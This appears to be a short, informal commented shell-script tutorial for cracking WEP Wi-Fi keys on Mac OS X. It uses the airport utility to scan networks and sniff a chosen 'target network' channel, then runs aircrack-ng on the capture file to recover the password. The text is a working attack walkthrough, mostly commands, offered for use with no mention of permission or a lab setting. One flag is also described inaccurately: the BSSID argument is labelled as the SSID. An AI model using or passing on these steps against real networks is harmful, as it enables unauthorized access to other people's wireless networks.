# I know it's outdated, but let's destory WEP!!!
# Btw, this is using the utils for Mac OS X. So if you don't have a mac....too bad.

# Run the airport util in your mac. If it is not a recognized command, you can find it it the
# /System/Library/Private/Frameworks/Apple802.11.framework/Versions/Current/Resources/Airport
# you can add a symlink to util or you can create a script to change into the directy automatically. Up to you..

# Anyways run the following to view what networks are available:

airport -s

# This should list the surrounding networks. If nothing shows up...go somewhere else..
# What you will need now is the channel the target network is on and the SSID

# Run the following command to start sniffing the channel

sudo airport sniff ch 1 en0

# The ch means channel ... obviously
# The en0 specifies which insterface you are using
# Yours might be en1 or even en2, but will most likely be en0

# Now we will open a new terminal window and we need to install aircrack
# I use brew but I believe that it is also able to be downloaded with Mac Ports. Not sure though
# Run the following to get aircrack

brew install aircrack-ng

# Now that we have aircrack, let's give the cracking a shot
# In your new terminal window, change to the tmp folders

cd /tmp && ls -l

# Find the new temp file that airport made. 
# It will look like airport24sj3214... 
# You can also find it by typing in ls -l a few times, and it will be the file that keeps growing in size
# I would open a new terminal window here. (Total of 3)
# Then run the following to start the attack

aircrack-ng -1 -a 1 -b <SSID> /tmp/Airport_File_Name

# And now we wait. Wait until the temp file reaches about 60000 in size and then try running the cmd. 
# Once you get the password, it will look similar to this:

PA:SS:WO:RD

# You need to remove the colons and NOW YOU'RE DONE
# YAYAYAY
